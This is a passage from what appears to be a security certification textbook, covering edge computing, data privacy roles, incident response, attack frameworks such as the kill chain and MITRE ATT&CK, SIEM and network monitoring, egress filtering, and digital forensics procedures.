Most of the cloud services we have considered so far are "user-facing." They support applications that human users interact with, such as video streaming, CRM, business analytics, email and conferencing, endpoint protection analytics, and so on. However, a very large and increasing amount of cloud data processing takes place with data generated by Internet of Things (IoT) devices and sensors. Industrial processes and even home automation are availability-focused. While confidentiality and integrity are still important concerns, service interruption in an operational technology network can be physically dangerous. Consequently, there is a strong requirement to retrieve and analyze IoT data with low latency.

A traditional data center architecture does not meet this requirement very well. Sensors are quite likely to have relatively low-bandwidth, higher latency WAN links to data networks. Sensors may generate huge quantities of data only a selection of which needs to be prioritized for analysis. Fog computing, developed by Cisco ([cisco.com/c/dam/en_us/solutions/trends/iot/docs/computing-overview.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/computing-overview.pdf)), addresses these requirements by placing fog node processing resources close to the physical location for the IoT sensors. The sensors communicate with the fog node, using Wi-Fi, ZigBee, or 4G/5G, and the fog node prioritizes traffic, analyzes and remediates alertable conditions, and backhauls remaining data to the data center for storage and low-priority analysis.

Edge computing is a broader concept partially developed from fog computing and partially evolved in parallel to it. Fog computing is now seen as working within the concept of edge computing. Edge computing uses the following concepts:

- Edge devices are those that collect and depend upon data for their operation. For example, a thermometer in an HVAC system collects temperature data; the controller in an HVAC system activates the electromechanical components to turn the heating or air conditioning on or off in response to ambient temperature changes. The impact of latency becomes apparent when you consider edge devices such as self-driving automobiles. 
- Edge gateways perform some pre-processing of data to and from edge devices to enable prioritization. They also perform the wired or wireless connectivity to transfer data to and from the storage and processing networks.
- Fog nodes can be incorporated as a data processing layer positioned close to the edge gateways, assisting the prioritization of critical data transmission.
- The cloud or data center layer provides the main storage and processing resources, plus distribution and aggregation of data between sites.

In security terms, the fog node or edge gateway layers represent high-value targets for both denial of service and data exfiltration attacks. 

The controversy over the use of Huawei's equipment within 5G and edge networks illustrates the risks and concerns over supply chains and trusted computing ([threatpost.com/huawei-5g-security-implications/152926](https://threatpost.com/huawei-5g-security-implications/152926/)).

PRIVACY AND SENSITIVE DATA CONCEPTS

The value of information assets can be thought of in terms of how a compromise of the data's security attributes of the confidentiality, integrity, and availability (CIA) triad would impact the organization. When surveying information within an organization, it is important not to solely judge how secretly it might need to be kept, but how the data is used within workflows. For example, the risk to confidentiality of public information is nonexistent. The risk to availability, however, could have significant impacts on workflows.

Data must be kept securely within a processing and storage system that enforces CIA attributes. In practice, this will mean a file or database management system that provides read or read/write access to authorized and authenticated accounts or denies access otherwise (by being encrypted, for instance). As distinct from this security requirement, you also need to consider the impact of privacy in shaping data governance.
### Privacy versus Security
While data security is important, privacy is an equally vital factor. Privacy is a data governance requirement that arises when collecting and processing personal data. Personal data is any information about an identifiable individual person, referred to as the data subject. Where data security controls focus on the CIA attributes of the processing system, privacy requires policies to identify private data, ensure that storage, processing, and retention is compliant with relevant regulations, limit access to the private data to authorized persons only, and ensure the rights of data subjects to review and remove any information held about them are met.
### Information Life Cycle Management
An information life cycle model identifies discrete steps to assist security and privacy policy design. Most models identify the following general stages:

- Creation/collection—data may be generated by an employee or automated system, or it may be submitted by a customer or supplier. At this stage, the data needs to be classified and tagged.
- Distribution/use—data is made available on a need to know basis for authorized uses by authenticated account holders and third parties.
- Retention—for regulatory reasons, data might have to be kept in an archive past the date when it is still used.
- Disposal—when it no longer needs to be used or retained, media storing data assets must be sanitized to remove any remnants.

Information management is a massive task in any organization. Most schemes focus on structured data (that is, information that is stored in a directory hierarchy and subject to administrative access controls). Managing and classifying unstructured data (emails, chat sessions, telephone calls, and so on) is an even more daunting task, though software solutions designed to tackle this problem are available.

DATA ROLES AND RESPONSIBILITIES

A data governance policy describes the security controls that will be applied to protect data at each stage of its life cycle. There are important institutional governance roles for oversight and management of information assets within the life cycle:

- Data owner—a senior (executive) role with ultimate responsibility for maintaining the confidentiality, integrity, and availability of the information asset. The owner is responsible for labeling the asset (such as determining who should have access and determining the asset's criticality and sensitivity) and ensuring that it is protected with appropriate controls (access control, backup, retention, and so forth). The owner also typically selects a steward and custodian and directs their actions and sets the budget and resource allocation for sufficient controls.
- Data steward—this role is primarily responsible for data quality. This involves tasks such as ensuring data is labeled and identified with appropriate metadata and that data is collected and stored in a format and with values that comply with applicable laws and regulations.
- Data custodian—this role handles managing the system on which the data assets are stored. This includes responsibility for enforcing access control, encryption, and backup/recovery measures.
- Data Privacy Officer (DPO)—this role is responsible for oversight of any personally identifiable information (PII) assets managed by the company. The privacy officer ensures that the processing, disclosure, and retention of PII complies with legal and regulatory frameworks.

In the context of legislation and regulations protecting personal privacy, the following two institutional roles are important:

- Data controller—the entity responsible for determining why and how data is stored, collected, and used and for ensuring that these purposes and means are lawful. The data controller has ultimate responsibility for privacy breaches, and is not permitted to transfer that responsibility.
- Data processor—an entity engaged by the data controller to assist with technical collection, storage, or analysis tasks. A data processor follows the instructions of a data controller with regard to collection or processing.

Data controller and processor tend to be organizational roles rather than individual ones. For example, if Widget.foo collects personal data to operate a webstore on its own cloud, it is a data controller and data processor. If Widget.foo passes aggregate data to Grommet.foo asking them to run profitability analytics for different customer segments on its AI-backed cloud, Grommet.foo is a data processor acting under the instruction of Widget.foo. Within the Grommet.foo and Widget.foo companies, the data owner might take personal responsibility for the lawful performance of data controller and processor functions.

DATA SOVEREIGNTY AND GEOGRAPHICAL CONSIDERATIONS

Some states and nations may respect data privacy more or less than others; and likewise, some nations may disapprove of the nature and content of certain data. They may even be suspicious of security measures such as encryption. When your data is stored or transmitted in other jurisdictions, or when you collect data from citizens in other states or other countries, you may not "own" the data in the same way as you'd expect or like to. 
### Data Sovereignty
Data sovereignty refers to a jurisdiction preventing or restricting processing and storage from taking place on systems which do not physically reside within that jurisdiction. Data sovereignty may demand certain concessions on your part, such as using location-specific storage facilities in a cloud service.

For example, GDPR protections are extended to any EU citizen while they are within EU or EEA (European Economic Area) borders. Data subjects can consent to allow a transfer but there must be a meaningful option for them to refuse consent. If the transfer destination jurisdiction does not provide adequate privacy regulations (to a level comparable to GDPR), then contractual safeguards must be given to extend GDPR rights to the data subject. In the US, companies can self-certify that the protections they offer are adequate under the Privacy Shield scheme ([privacyshield.gov/US-Businesses](https://www.privacyshield.gov/US-Businesses)).
### Geographical Considerations
Geographic access requirements fall into two different scenarios:

- Storage locations might have to be carefully selected to mitigate data sovereignty issues. Most cloud providers allow choice of data centers for processing and storage, ensuring that information is not illegally transferred from a particular privacy jurisdiction without consent.
- Employees needing access from multiple geographic locations. Cloud-based file and database services can apply constraint-based access controls to validate the user's geographic location before authorizing access.

INCIDENT RESPONSE PROCESS 

Incident response policy sets the resources, processes, and guidelines for dealing with security incidents. Incident management is vital to mitigating risk. As well as controlling the immediate or specific threat to security, effective incident management preserves an organization's reputation.

Incident response follows a well-structured process, such as that set out in the NIST Computer Security Incident Handling Guide special publication ([nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/NIST.SP.800-61r2.pdf)). The following are the principal stages in an incident response life cycle:

1. Preparation—make the system resilient to attack in the first place. This includes hardening systems, writing policies and procedures, and setting up confidential lines of communication. It also implies creating incident response resources and procedures.
1. Identification—from the information in an alert or report, determine whether an incident has taken place, assess how severe it might be (triage), and notify stakeholders.
1. Containment—limit the scope and magnitude of the incident. The principal aim of incident response is to secure data while limiting the immediate impact on customers and business partners.
1. Eradication—once the incident is contained, remove the cause and restore the affected system to a secure state by wiping a system and applying secure configuration settings.
1. Recovery—with the cause of the incident eradicated, the system can be reintegrated into the business process that it supports. Applying patches and updates to a system to help prevent future incidents is important as well. This recovery phase may involve restoration of data from backup and security testing. Systems must be monitored more closely for a period to detect and prevent any reoccurrence of the attack. The response process may have to iterate through multiple phases of identification, containment, eradication, and recovery to effect a complete resolution.
1. Lessons learned—analyze the incident and responses to identify whether procedures or systems could be improved. It is imperative to document the incident. The outputs from this phase feed back into a new preparation phase in the cycle.

Incident response is likely to require coordinated action and authorization from several different departments or managers, which adds further levels of complexity.

INCIDENT RESPONSE PLAN

An incident response plan (IRP) lists the procedures, contacts, and resources available to responders for various incident categories. The CSIRT should develop profiles or scenarios of typical incidents (DDoS attack, virus/worm outbreak, data exfiltration by an external adversary, data modification by an internal adversary, and so on). This will guide investigators in determining priorities and remediation plans. A playbook (or runbook) is a data-driven standard operating procedure (SOP) to assist junior analysts in detecting and responding to specific cyberthreat scenarios, such as phishing attempts, SQL injection data exfiltration, connection to a block-listed IP range, and so on. The playbook starts with a SIEM report and query designed to detect the incident and identify the key detection, containment, and eradication steps to take.

Incident categories and definitions ensure that all response team members and other organizational personnel all have a common base of understanding of the meaning of terms, concepts, and descriptions. The categories, types, and definitions might vary according to industry. For a listing of the US federal agency incident categories, you can visit [us-cert.cisa.gov/sites/default/files/publications/Federal_Incident_Notification_Guidelines.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/Federal_Incident_Notification_Guidelines.pdf).

One challenge in incident management is to allocate resources efficiently. This means that identified incidents must be assessed for severity and prioritized for remediation. There are several factors that can affect this process:

- Data integrity—the most important factor in prioritizing incidents will often be the value of data that is at risk.
- Downtime—another very important factor is the degree to which an incident disrupts business processes. An incident can either degrade (reduce performance) or interrupt (completely stop) the availability of an asset, system, or business process. If you have completed an asset inventory and a thorough risk assessment of business processes (showing how assets and computer systems assist each process), then you can easily identify critical processes and quantify the impact of an incident in terms of the cost of downtime.
- Economic/publicity—both data integrity and downtime will have important economic effects, both in the short term and the long term. Short-term costs involve incident response itself and lost business opportunities. Long-term economic costs may involve damage to reputation and market standing.
- Scope—the scope of an incident (broadly the number of systems affected) is not a direct indicator of priority. A large number of systems might be infected with a type of malware that degrades performance, but is not a data breach risk. This might even be a masking attack as the adversary seeks to compromise data on a single database server storing top-secret information.
- Detection time—research has shown that the existence of more than half of data breaches are not detected for weeks or months after the intrusion occurs, while in a successful intrusion, data is typically breached within minutes. This demonstrates that the systems used to search for intrusions must be thorough and the response to detection must be fast.
- Recovery time—some incidents require lengthy remediation as the system changes required are complex to implement. This extended recovery period should trigger heightened alertness for continued or new attacks.

CYBER KILL CHAIN ATTACK FRAMEWORK

Effective incident response depends on threat intelligence. Threat research provides insight into adversary tactics, techniques, and procedures (TTPs). Insights from threat research can be used to develop specific tools and playbooks to deal with event scenarios. A key tool for threat research is a framework to use to describe the stages of an attack. These stages are often referred to as a cyber kill chain, following the influential white paper Intelligence-Driven Computer Network Defense commissioned by Lockheed Martin ([lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/LM-White-Paper-Intel-Driven-Defense.pdf)).

Stages in the kill chain.

The Lockheed Martin kill chain identifies the following phases:

1. Reconnaissance—in this stage the attacker determines what methods to use to complete the phases of the attack and gathers information about the target's personnel, computer systems, and supply chain.
1. Weaponization—the attacker couples payload code that will enable access with exploit code that will use a vulnerability to execute on the target system.
1. Delivery—the attacker identifies a vector by which to transmit the weaponized code to the target environment, such as via an email attachment or on a USB drive.
1. Exploitation—the weaponized code is executed on the target system by this mechanism. For example, a phishing email may trick the user into running the code, while a drive-by-download would execute on a vulnerable system without user intervention.
1. Installation—this mechanism enables the weaponized code to run a remote access tool and achieve persistence on the target system.
1. Command and control (C2 or C&C)—the weaponized code establishes an outbound channel to a remote server that can then be used to control the remote access tool and possibly download additional tools to progress the attack.
1. Actions on objectives—in this phase, the attacker typically uses the access he has achieved to covertly collect information from target systems and transfer it to a remote system (data exfiltration). An attacker may have other goals or motives, however.

OTHER ATTACK FRAMEWORKS

Other types of attack framework have been implemented to provide a means of categorizing features of adversary behaviors to make it easier to identify indicators of such attacks.
### MITRE ATT&CK
As an alternative to the life cycle analysis implied by a kill chain, the MITRE Corporation's Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) matrices provide access to a database of known TTPs. This freely available resource ([attack.mitre.org](https://attack.mitre.org/)) tags each technique with a unique ID and places it in one or more tactic categories, such as initial access, persistence, lateral movement, or command and control. The sequence in which attackers may deploy any given tactic category is not made explicit. This means analysts must interpret each attack life cycle from local evidence. The framework makes TTPs used by different adversary groups directly comparable, without assuming how any particular adversary will run a campaign at a strategic level.

There is a matrix for enterprise, which can also be viewed as TTPs directed against Linux, macOS, and Windows hosts, and a second matrix for mobile. For example, Drive by Compromise is given the ID T1189 and categorized as an Initial Access tactic that can target Windows, Linux, and macOS hosts. Clicking through to the page accesses information about detection methods, mitigation methods, and examples of historic uses and analysis.
### The Diamond Model of Intrusion Analysis
The Diamond Model of Intrusion Analysis suggests a framework to analyze an intrusion event (E) by exploring the relationships between four core features: adversary, capability, infrastructure, and victim. These four features are represented by the four vertices of a diamond shape. Each event may also be described by meta-features, such as date/time, kill chain phase, result, and so on. Each feature is also assigned a confidence level (C), indicating data accuracy or the reliability of a conclusion or assumption assigned to the value by analysis.

Intrusion event represented in the Diamond Model. (Image: Released to public domain by Sergio Caltagirone, Andrew Pendergast, and Christopher Betz [[activeresponse.org/wp-content/uploads/2013/07/diamond.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/diamond.pdf)].)

SIEM DASHBOARDS 

SIEM dashboards are one of the main sources of automated alerts. A SIEM dashboard provides a console to work from for day-to-day incident response. Separate dashboards can be created to suit many different purposes. An incident handler's dashboard will contain uncategorized events that have been assigned to their account, plus visualizations (graphs and tables) showing key status metrics. A manager's dashboard would show overall status indicators, such as number of unclassified events for all event handlers.

The SGUIL console in Security Onion. A SIEM can generate huge numbers of alerts that need to be manually assessed for priority and investigation. (Screenshot courtesy of Security Onion [securityonion.net](https://securityonion.net/).)
### Sensitivity and Alerts 
One of the greatest challenges in operating a SIEM is tuning the system sensitivity to reduce false positive indicators being reported as an event. This is difficult firstly because there isn't a simple dial to turn for overall sensitivity, and secondly because reducing the number of rules that produce events increases the risk of false negatives. A false negative is where indicators that should be correlated as an event and raise an alert are ignored.

The correlation rules are likely to assign a criticality level to each match. For example:

- Log only—an event is produced and added to the SIEM's database, but it is automatically classified.
- Alert—the event is listed on a dashboard or incident handling system for an agent to assess. The agent classifies the event and either dismisses it to the log or escalates it as an incident.
- Alarm—the event is automatically classified as critical and a priority alarm is raised. This might mean emailing an incident handler or sending a text message.
### Sensors
A sensor is a network tap or port mirror that performs packet capture and intrusion detection. One of the key uses of a SIEM is to aggregate data from multiple sensors and log sources, but it might also be appropriate to configure dashboards that show output from a single sensor or source host.

TREND ANALYSIS 

Trend analysis is the process of detecting patterns or indicators within a data set over a time series and using those patterns to make predictions about future events. A trend is difficult to spot by examining each event in a log file. Instead, you need software to visualize the incidence of types of event and show how the number or frequency of those events changes over time. Trend analysis can apply to frequency, volume, or statistical deviation:

- Frequency-based trend analysis establishes a baseline for a metric, such as number of NXERROR DNS log events per hour of the day. If the frequency exceeds (or in some cases undershoots) the threshold for the baseline, then an alert is raised.
- Volume-based trend analysis can be performed with simpler indicators. For example, one simple metric for determining threat level is log volume. If logs are growing much faster than they were previously, there is a good chance that something needs investigating. Volume-based analysis also applies to network traffic. You might also measure endpoint disk usage. Client workstations don’t usually need to store data locally, so if a host's disk capacity has suddenly diminished, it could be a sign that it is being used to stage data for exfiltration.
- Statistical deviation analysis can show when a data point should be treated as suspicious. For example, a cluster graph might show activity by standard users and privileged users, invoking analysis of behavioral metrics of what processes each type runs, which systems they access, and so on. A data point that appears outside the two clusters for standard and administrative users might indicate some suspicious activity by that account.

LOGGING PLATFORMS

Log data from network appliances and hosts can be aggregated by a SIEM either by installing a local agent to collect and parse the log data or by using a forwarding system to transmit logs directly to the SIEM server. Also, organizations may not operate a SIEM, but still use a logging platform to aggregate log data in a central location.
### Syslog 
Syslog ([tools.ietf.org/html/rfc3164](https://tools.ietf.org/html/rfc3164)) provides an open format, protocol, and server software for logging event messages. It is used by a very wide range of host types. For example, syslog messages can be generated by Cisco routers and switches, as well as servers and workstations. It usually uses UDP port 514.

A syslog message comprises a PRI code, a header containing a timestamp and host name, and a message part. The PRI code is calculated from the facility and a severity level. The message part contains a tag showing the source process plus content. The format of the content is application-dependent. It might use space- or comma-delimited fields or name/value pairs, such as JSON data.

RFC 5424 ([tools.ietf.org/html/rfc5424](https://tools.ietf.org/html/rfc5424)) adjusts the structure slightly to split the tag into app name, process ID, and message ID fields, and to make them part of the header.
### Rsyslog and Syslog-ng
There have been two updates to the original syslog specification:

- Rsyslog uses the same configuration file syntax, but can work over TCP and use a secure connection. Rsyslog can use more types of filter expressions in its configuration file to customize message handling.
- Syslog-ng uses a different configuration file syntax, but can also use TCP/secure communications and more advanced options for message filtering. 
### journalctl
In Linux, text-based log files of the sort managed by syslog can be viewed using commands such as cat, tail, and head. Most modern Linux distributions now use systemd to initialize the system and to start and manage background services. Rather than writing events to syslog-format text files, logs from processes managed by systemd are written to a binary-format file called journald. Events captured by journald can be forwarded to syslog. To view events in journald directly, you can use the journalctl command to print the entire journal log, or you can issue various options with the command to filter the log in a variety of ways, such as matching a service name or only printing messages matching the specified severity level.
### NXlog
NXlog ([nxlog.co](https://nxlog.co/)) is an open-source log normalization tool. One principal use for it is to collect Windows logs, which use an XML-based format, and normalize them to a syslog format.

NETWORK DATA SOURCES

Network data is typically analyzed in detail at the level of individual frames or using summary statistics of traffic flows and protocol usage.
### Protocol Analyzer Output
A SIEM will store details from sensors at different points on the network. Information captured from network packets can be aggregated and summarized to show overall protocol usage and endpoint activity. The contents of packets can also be recorded for analysis. Recording the full data of every packet—referred to as retrospective network analysis (RNA)—is too costly for most organizations. Typically, packet contents are only retained when indicators from the traffic are correlated as an event. The SIEM software will provide the ability to pivot from the event or alert summary to the underlying packets. Detailed analysis of the packet contents can help to reveal the tools used in an attack. It is also possible to extract binary files such as potential malware for analysis.
### Netflow/IPFIX 
A flow collector is a means of recording metadata and statistics about network traffic rather than recording each frame. Network traffic and flow data may come from a wide variety of sources (or probes), such as switches, routers, firewalls, web proxies, and so forth. Flow analysis tools can provide features such as:

- Highlighting of trends and patterns in traffic generated by particular applications, hosts, and ports.
- Alerting based on detection of anomalies, flow analysis patterns, or custom triggers.
- Visualization tools that enable you to quickly create a map of network connections and interpret patterns of traffic and flow data.
- Identification of traffic patterns revealing rogue user behavior, malware in transit, tunneling, applications exceeding their allocated bandwidth, and so forth.
- Identification of attempts by malware to contact a handler or command & control (C&C) channel.

NetFlow is a Cisco-developed means of reporting network flow information to a structured database. NetFlow has been redeveloped as the IP Flow Information Export (IPFIX) IETF standard ([tools.ietf.org/html/rfc7011](https://tools.ietf.org/html/rfc7011)). A particular traffic flow can be defined by packets sharing the same characteristics, referred to as keys, such as IP source and destination addresses and protocol type. A selection of keys is called a flow label, while traffic matching a flow label is called a flow record. 

You can use a variety of NetFlow monitoring tools to capture data for point-in-time analysis and to diagnose any security or operational issues the network is experiencing. There are plenty of commercial NetFlow suites, plus products offering similar functionality to NetFlow. The SiLK suite ([tools.netsa.cert.org/silk/](https://tools.netsa.cert.org/silk/)) and nfdump/nfsen ([nfsen.sourceforge.net/](http://nfsen.sourceforge.net/)) are examples of open-source implementations. Another popular tool is Argus ([openargus.org](https://openargus.org/)). This uses a different data format to NetFlow, but the client tools can read and translate NetFlow data. 
### sFlow
sFlow, developed by HP and subsequently adopted as a web standard ([tools.ietf.org/html/rfc3176](https://tools.ietf.org/html/rfc3176)), uses sampling to measure traffic statistics at any layer of the OSI model for a wider range of protocol types than the IP-based Netflow. sFlow can also capture the entire packet header for samples. 
### Bandwidth Monitor
Bandwidth usage can be a key indicator of suspicious behavior, if you have reliable baselines for comparison. Unexpected bandwidth consumption could be evidence of a data exfiltration attack, for instance. Bandwidth usage can be reported by flow collectors. Firewalls and web security gateways are also likely to support bandwidth monitoring and alerting.

FIREWALL CONFIGURATION CHANGES

Analysis of an attack should identify the vector exploited by the attacker. This analysis is used to identify configuration changes that block that attack vector. A configuration change may mean the deployment of a new type of security control, or altering the settings of an existing control to make it more effective.

Historically, many organizations focused on ingress filtering rules, designed to prevent local network penetration from the Internet. In the current threat landscape, it is imperative to also apply strict egress filtering rules to prevent malware that has infected internal hosts by other means from communicating out to C&C servers. Egress filtering can be problematic in terms of interrupting authorized network activity, but it is an essential component of modern network defense. Some general guidelines for configuring egress filtering are:

- Allow only authorized application ports and, if possible, restrict the destination addresses to authorized Internet hosts. Where authorized hosts cannot be identified or a default deny is too restrictive, use URL and content filtering to try to detect malicious traffic over authorized protocols.
- Restrict DNS lookups to your own or your ISP's DNS services or authorized public resolvers, such as Google's or Quad9's DNS services.
- Block access to "known bad" IP address ranges, as listed on don't route or peer (DROP) filter lists.
- Block access from any IP address space that is not authorized for use on your local network.
- Block all Internet access from host subnets that do not need to connect to the Internet, such as most types of internal server, workstations used to manage industrial control systems (ICSs), and so on.

Even within these rules, there is a lot of scope for threat actors to perform command signaling and exfiltration. For example, cloud services, such as content delivery networks and social media platforms, can be used to communicate scripts and malware commands and to exfiltrate data over HTTPS ([rhinosecuritylabs.com/aws/hiding-cloudcobalt-strike-beacon-c2-using-amazon-apis](https://rhinosecuritylabs.com/aws/hiding-cloudcobalt-strike-beacon-c2-using-amazon-apis/)). 

CONTENT FILTER CONFIGURATION CHANGES

The limitations of a basic packet filtering firewall (even if it is stateful) mean that some sort of content filtering application proxy may provide better security. These types of appliances are usually referred to as secure web gateways (SWGs). A SWG mediates user access to Internet services, with the ability to block content from regularly updated URL/domain/IP block lists and perform intrusion detection/prevention on traffic based on matching content in application layer protocol headers and payloads.

If a SWG is already in place, an attacker may have found a way to circumvent it via some sort of backdoor. The network configuration should be checked and updated to ensure that all client access to the Internet must pass through the SWG. Another possibility is that the attacker is using a protocol or C&C method that is not filtered. The SWG should be updated with scripts and data, domains and IP addresses, that will block the exploit.
### Data Loss Prevention (DLP)
Data loss prevention (DLP) performs a similar function, but instead of user access it mediates the copying of tagged data to restrict it to authorized media and services. An attack may reveal the necessity of investing in DLP as a security control if one is not already implemented. If DLP is enabled and configured in the correct way to enforce policy, the attacker may have been able to circumvent it using a backdoor method that the DLP software cannot scan. Alternatively, the attacker may have been able to disguise the data so that it was not recognized.
### Mobile Device Management (MDM) 
Mobile Device Management (MDM) provides execution control over apps and features of smartphones. Features include GPS, camera, and microphone. As with DLP, an intrusion might reveal a vector that allowed the threat actor to circumvent enrollment or a misconfiguration in the MDM's policy templates. 
### Update or Revoke Certificates
Compromise of the private key represented by a digital certificate or the ability to present spoofed certificates as trusted is a critical security vulnerability as it allows an attacker to impersonate trusted resources and potentially gain unauthorized access to secure systems.

- Remove compromised root certificates—if an attacker has managed to install a root certificate, the attacker can make malicious hosts and services seem trusted. Suspicious root certificates must be removed from the client's cache.
- Revoke certificates on compromised hosts—if a host is compromised, the private key it used for digital signatures or digital envelopes is no longer safe. The certificate associated with the key should be revoked using the Key Compromise property. The certificate can be rekeyed with a new key pair but the same subject and expiry information.

ENDPOINT CONFIGURATION CHANGES

If endpoint security is breached, there are several classes of vector to consider for mitigation:

- Social engineering—if the malware was executed by a user, use security education and awareness to reduce the risk of future attacks succeeding. Review permissions to see if the account could be operated with a lower privilege level.
- Vulnerabilities—if the malware exploited a software fault, either install the patch or isolate the system until a patch can be developed.
- Lack of security controls—if the attack could have been prevented by endpoint protection/A-V, host firewall, content filtering, DLP, or MDM, investigate the possibility of deploying them to the endpoint. If this is not practical, isolate the system from being exploited by the same vector.
- Configuration drift—if the malware exploited an undocumented configuration change (shadow IT software or an unauthorized service/port, for instance), reapply the baseline configuration and investigate configuration management procedures to prevent this type of ad hoc change.
- Weak configuration—if the configuration was correctly applied, but was exploited anyway, review the template to devise more secure settings. Make sure the template is applied to similar hosts. 
### Application Allow Lists and Block Lists
One element of endpoint configuration is an execution control policy that defines applications that can or cannot be run.

- An allow list (or approved list) denies execution unless the process is explicitly authorized.
- A block list (or deny list) generally allows execution, but explicitly prohibits listed processes.

You will need to update the contents of allow lists and block lists in response to incidents and as a result of ongoing threat hunting and monitoring. Threat hunting may also provoke a strategic change. For example, if you rely principally on explicit denies, but your systems are subject to numerous intrusions, you will have to consider adopting a "least privileges" model and using a deny-unless-listed approach. This sort of change has the potential to be highly disruptive however, so it must be preceded by a risk assessment and business impact analysis.

Execution control can also be tricky to configure effectively, with many opportunities for threat actors to evade the controls. Detailed analysis of the attack might show the need for changes to the existing mechanism, or the use of a more robust system.
### Quarantine
If mitigating techniques are not successful, or the results are uncertain, the endpoint will require careful management before being integrated back onto the network. If further evidence needs to be gathered, the best approach may be to quarantine or sandbox the endpoint or suspect process/file. This allows for analysis of the attack or tool and collection of evidence using digital forensic techniques.

KEY ASPECTS OF DIGITAL FORENSICS 

Digital forensics is the practice of collecting evidence from computer systems to a standard that will be accepted in a court of law. Forensics investigations are most likely to be launched against crimes arising from insider threats, notably fraud or misuse of equipment (to download or store obscene material, for instance). Prosecuting external threat sources is often difficult, as the threat actor may well be in a different country or have taken effective steps to disguise his or her location and identity. Such prosecutions are normally initiated by law enforcement agencies, where the threat is directed against military or governmental agencies or is linked to organized crime. 
### Evidence, Documentation, and Admissibility
Like DNA or fingerprints, digital evidence is latent. Latent means that the evidence cannot be seen with the naked eye; rather, it must be interpreted using a machine or process. This means that great care must be taken to ensure the admissibility of digital evidence. As well as the physical evidence (a hard drive, for instance), digital forensics requires documentation showing how the evidence was collected and analyzed without tampering or bias.

Due process is a term used in US and UK common law to require that people only be convicted of crimes following the fair application of the laws of the land. More generally, due process can be understood to mean having a set of procedural safeguards to ensure fairness. This principle is central to forensic investigation. If a forensic investigation is launched (or if one is a possibility), it is important that technicians and managers are aware of the processes that the investigation will use. It is vital that they are able to assist the investigator and that they not do anything to compromise the investigation. In a trial, defense counsel will try to exploit any uncertainty or mistake regarding the integrity of evidence or the process of collecting it.

The first response period following detection and notification is often critical. To gather evidence successfully, it is vital that staff do not panic or act in a way that would compromise the investigation. 
### Legal Hold
Legal hold refers to the fact that information that may be relevant to a court case must be preserved. Information subject to legal hold might be defined by regulators or industry best practice, or there may be a litigation notice from law enforcement or lawyers pursuing a civil action. This means that computer systems may be taken as evidence, with all the obvious disruption to a network that entails. 
### Chain of Custody
Chain of custody documentation reinforces the integrity and proper handling of evidence from collection, to analysis, to storage, and finally to presentation. When security breaches go to trial, the chain of custody protects an organization against accusations that evidence has either been tampered with or is different than it was when it was collected. Every person in the chain who handles evidence must log the methods and tools they used.

E-DISCOVERY

A forensic examination of a device such as a fixed drive that contains Electronically Stored Information (ESI) entails a search of the whole drive (including both allocated and unallocated sectors, for instance). E-discovery is a means of filtering the relevant evidence produced from all the data gathered by a forensic examination and storing it in a database in a format such that it can be used as evidence in a trial. E-discovery software tools have been produced to assist this process. Some of the functions of e-discovery suites are:

- Identify and deduplicate files and metadata—many files on a computer system are "standard" installed files or copies of the same file. E-discovery filters these types of files, reducing the volume of data that must be analyzed.
- Search—allow investigators to locate files of interest to the case. As well as keyword search, software might support semantic search. Semantic search matches keywords if they correspond to a particular context.
- Tags—apply standardized keywords or labels to files and metadata to help organize the evidence. Tags might be used to indicate relevancy to the case or part of the case or to show confidentiality, for instance.
- Security—at all points evidence must be shown to have been stored, transmitted, and analyzed without tampering.
- Disclosure—an important part of trial procedure is that the same evidence be made available to both plaintiff and defendant. E-discovery can fulfill this requirement. Recent court cases have required parties to a court case to provide searchable ESI rather than paper records. 

DATA ACQUISITION AND ORDER OF VOLATILITY

Acquisition is the process of obtaining a forensically clean copy of data from a device held as evidence. If the computer system or device is not owned by the organization, there is the question of whether search or seizure is legally valid. This impacts bring-your-own-device (BYOD) policies. For example, if an employee is accused of fraud you must verify that the employee's equipment and data can be legally seized and searched. Any mistake may make evidence gained from the search inadmissible.

Data acquisition is also complicated by the fact that it is more difficult to capture evidence from a digital crime scene than it is from a physical one. Some evidence will be lost if the computer system is powered off; on the other hand, some evidence may be unobtainable until the system is powered off. Additionally, evidence may be lost depending on whether the system is shut down or "frozen" by suddenly disconnecting the power.

Data acquisition usually proceeds by using a tool to make an image from the data held on the target device. An image can be acquired from either volatile or nonvolatile storage. The general principle is to capture evidence in the order of volatility, from more volatile to less volatile. The ISOC best practice guide to evidence collection and archiving, published as [tools.ietf.org/html/rfc3227](https://tools.ietf.org/html/rfc3227), sets out the general order as follows:

1. CPU registers and cache memory (including cache on disk controllers, GPUs, and so on).
1. Contents of nonpersistent system memory (RAM), including routing table, ARP cache, process table, kernel statistics.
1. Data on persistent mass storage devices (HDDs, SSDs, and flash memory devices):
- Partition and file system blocks, slack space, and free space.
- System memory caches, such as swap space/virtual memory and hibernation files.
- Temporary file caches, such as the browser cache.
- User, application, and OS files and directories.
4. Remote logging and monitoring data.
4. Physical configuration and network topology.
4. Archival media and printed documents.

The Windows registry is mostly stored on disk, but there are keys—notably HKLM\Hardware—that only ever exist in memory. The contents of the registry can be analyzed via a memory dump.

DIGITAL FORENSICS SOFTWARE

Digital forensics software is designed to assist with the acquisition, documentation, and analysis of digital evidence. Most of the commercial forensics tools are available for the Windows platform only.

- EnCase Forensic is a digital forensics case management product created by Guidance Software ([guidancesoftware.com/encase-forensic?cmpid=nav_r](https://www.guidancesoftware.com/encase-forensic?cmpid=nav_r)). Case management is assisted by built-in pathways, or workflow templates, showing the key steps in diverse types of investigation. In addition to the core forensics suite, there are separate products for e-discovery (digital evidence management) and Endpoint Investigator (for over-the-network analysis of corporate desktops and servers).
- The Forensic Toolkit (FTK) from AccessData ([accessdata.com/products-services/forensic-toolkit-ftk](https://accessdata.com/products-services/forensic-toolkit-ftk)) is another commercial investigation suite designed to run on Windows Server (or server cluster).
